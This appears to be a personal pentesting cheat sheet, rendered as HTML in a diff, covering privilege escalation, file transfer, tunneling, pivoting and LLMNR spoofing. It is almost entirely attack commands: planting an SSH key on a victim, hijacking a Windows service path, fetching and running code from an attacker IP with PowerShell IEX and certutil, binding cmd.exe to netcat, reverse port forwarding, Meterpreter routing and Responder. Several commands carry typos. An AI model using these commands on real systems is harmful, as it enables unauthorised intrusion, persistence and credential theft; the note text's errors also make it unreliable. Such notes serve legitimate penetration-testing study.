@@ -1,0 +1,112 @@
+I"© <h1 id="privilege-escalation">Privilege escalation</h1>
+
+<h3 id="ssh">SSH</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh-keygen <span class="nt">-f</span> user <span class="c"># Attack</span>
+
+<span class="c"># Victim</span>
+<span class="nb">mkdir</span>  <span class="o">(</span>home/<span class="o">)</span>~www-data/
+<span class="nb">mkdir</span> ~/.ssh/
+<span class="nb">touch</span> ~/.ssh/authorized_keys
+<span class="nb">echo</span> <span class="s2">"public_key"</span> <span class="o">&gt;</span> ~/.ssh/authorized_keys
+ssh www-data@172.0.0.1 <span class="nt">-p</span> 2222 <span class="nt">-i</span> user
+</code></pre></div></div>
+
+<h2 id="windows">Windows</h2>
+<h3 id="automatized">Automatized</h3>
+<ul>
+  <li><a href="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS/winPEASbat">winPEAS</a></li>
+</ul>
+
+<h3 id="mandatory-level">Mandatory level</h3>
+<ul>
+  <li>whoami /groups</li>
+</ul>
+
+<h3 id="services">Services</h3>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">wmic</span><span class="w"> </span><span class="nx">service</span><span class="w"> </span><span class="c"># List services</span><span class="w">
+</span><span class="n">wmic</span><span class="w"> </span><span class="nx">service</span><span class="w"> </span><span class="nx">get</span><span class="w"> </span><span class="nx">Name</span><span class="p">,</span><span class="nx">Sate</span><span class="p">,</span><span class="nx">PathName</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">findstr</span><span class="w"> </span><span class="s2">"Running"</span><span class="w"> </span><span class="c"># Running services</span><span class="w">
+</span><span class="n">sc</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="nx">servicename</span><span class="w"> </span><span class="c"># Informations about a service </span><span class="w">
+</span><span class="n">sc</span><span class="w"> </span><span class="nx">qc</span><span class="w"> </span><span class="nx">servicename</span><span class="w"> </span><span class="c"># Service configurations</span><span class="w">
+</span><span class="n">sc</span><span class="w"> </span><span class="nx">config</span><span class="w"> </span><span class="nx">servicename</span><span class="w"> </span><span class="nx">binPath</span><span class="o">=</span><span class="s2">"certutil -urlcache -f priv.exe"</span><span class="w"> </span><span class="c"># Change the path of the file</span><span class="w">
+</span><span class="n">sc</span><span class="w"> </span><span class="nx">start</span><span class="w"> </span><span class="nx">servicename</span><span class="w">
+</span></code></pre></div></div>
+
+<h2 id="linux">Linux</h2>
+<h3 id="automatized-1">Automatized</h3>
+<ul>
+  <li><a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS">linPEAS</a></li>
+  <li><a href="https://gtfobins.github.io/">gtfobins</a></li>
+  <li><a href="https://github.com/mzet-/linux-exploit-suggester">linux-exploit-suggester</a></li>
+</ul>
+
+<h3 id="suidgetuid">SUID/GETUID</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / <span class="nt">-user</span> root <span class="nt">-perm</span> <span class="nt">-4000</span> <span class="nt">-print</span> 2&gt;/dev/null 
+</code></pre></div></div>
+
+<h3 id="permissions">Permissions</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> <span class="nt">-l</span> <span class="c"># Programs that run as sudo</span>
+
+find / <span class="nt">-type</span> f <span class="nt">-perm</span> 777 2&gt;/dev/null <span class="c"># Files with permissions</span>
+
+<span class="nb">ls</span> /etc/cron.<span class="k">*</span> <span class="c"># Check all crontab folders</span>
+
+<span class="nb">uname</span> <span class="nt">-l</span> <span class="c"># Kernel and SO versions</span>
+<span class="nb">cat</span> /etc/issue
+</code></pre></div></div>
+
+<h2 id="transfer-files">Transfer files</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python <span class="nt">-m</span> SimpleHTTPServer 80 <span class="c">#Open server</span>
+python3 <span class="nt">-m</span> http.server 80
+
+<span class="c"># Windows</span>
+certutil.exe <span class="nt">-urlcache</span> <span class="nt">-f</span> <span class="o">[</span>http://172.20.1.6/file.exe]<span class="o">(</span>http://172.20.1.6/file.exe<span class="o">)</span> file.exe
+powershell.exe wget <span class="o">[</span>http://172.20.1.6/file.exe]<span class="o">(</span>http://172.20.1.6/file.exe<span class="o">)</span> <span class="nt">-OutFile</span> file.exe
+powershell.exe <span class="o">(</span>New-Object System.Net.WebClient<span class="o">)</span>.DownloadFile<span class="o">(</span><span class="s1">'http://172.20.1.6/file.exe'</span>,<span class="s1">'file.exe'</span><span class="o">)</span>
+powershell.exe IEX<span class="o">(</span>New-Object System.Net.WebClient<span class="o">)</span>.DownloadString<span class="o">(</span><span class="s1">'http://172.20.1.6/poc.txt'</span><span class="o">)</span> <span class="c"># Read and execute </span>
+<span class="c"># Windows hex</span>
+/usr/share/windows-resources/binaries/upx <span class="nt">-9</span> exec.exe <span class="c"># Compress</span>
+exe2hex <span class="nt">-x</span> exec.exe <span class="nt">-p</span> exec.txt <span class="c"># To hex</span>
+nc <span class="nt">-l</span> 10.10.10.10 4444 &lt; exec.txt
+
+<span class="c"># Linux</span>
+wget http://172.20.1.6/file.exe <span class="nt">-O</span> /tm/file.exe
+curl http://172.20.1.6/file.exe <span class="nt">-o</span> file.exe
+
+scp /source/folder/scp.zip root@191.162.0.2:/destiny/folder <span class="c">#ssh</span>
+</code></pre></div></div>
+
+<h2 id="tunneling">Tunneling</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Windows </span>
+nc.exe <span class="nt">-vnlp</span> 5555 <span class="nt">-s</span> 127.0.0.1 <span class="nt">-e</span> cmd.exe <span class="c"># Attacker</span>
+plink.exe <span class="nt">-ssh</span> <span class="nt">-l</span> user <span class="nt">-pw</span> root <span class="nt">-R</span> 192.168.0.8:1337:127.0.0.1:5555 192.168.0.8 <span class="c"># Victim</span>
+nc <span class="nt">-v</span> 127.0.0.1 1337 <span class="c"># Attacker</span>
+
+<span class="c"># Linux</span>
+socat TCP-LISTEN:8443,reuseaddr,fork TCP-LISTEN:2222,reuseaddr
+socat TCP4:172.20.1.6:8443 TCP4:127.0.0.1:22
+
+ssh www-data@172.0.0.1 <span class="nt">-p</span> 2222 <span class="nt">-i</span> us <span class="nt">-L</span> 3333:127.0.0.1:3306
+</code></pre></div></div>
+
+<h2 id="pivoting">Pivoting</h2>
+<p>Meterpreter</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ipconfig <span class="c"># Networks interface</span>
+route <span class="c"># Identify network</span>
+
+run autoroute <span class="nt">-s</span> 10.0.20.0/24 <span class="c">#Add a route to our machine</span>
+use auxiliary/server/sock4a <span class="c"># Create a proxy in port 1080</span>
+nano /ect/proxychains.conf <span class="c"># Add this proxy to proxychains</span>
+proxychains nmap <span class="nt">-v</span> â€”open <span class="nt">-sT</span> <span class="nt">-p</span> 110,139 <span class="nt">-Pn</span> 10.10.20.0/24 <span class="c"># The network is visible</span>
+V
+portfwd add <span class="nt">-l</span> 110 <span class="nt">-p</span> 110 <span class="nt">-r</span> 10.20.20.4 <span class="c"># Portfoward  a specific port</span>
+nmap <span class="nt">-sV</span> <span class="nt">-p</span> 110 127.0.0.10 <span class="c"># Can acess this port</span>
+</code></pre></div></div>
+
+<h2 id="internal-pentest">Internal pentest</h2>
+<h3 id="responder">Responder</h3>
+<p>A LLMNR &amp; NBT-NS Spoofing Attack.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vim /etc/responder/Responder.conf <span class="c"># Configure the ips field RespondTo</span>
+
+responder <span class="nt">-I</span> eth0 <span class="nt">-Prv</span> <span class="c"># Will list to all</span>
+</code></pre></div></div>
+:ET
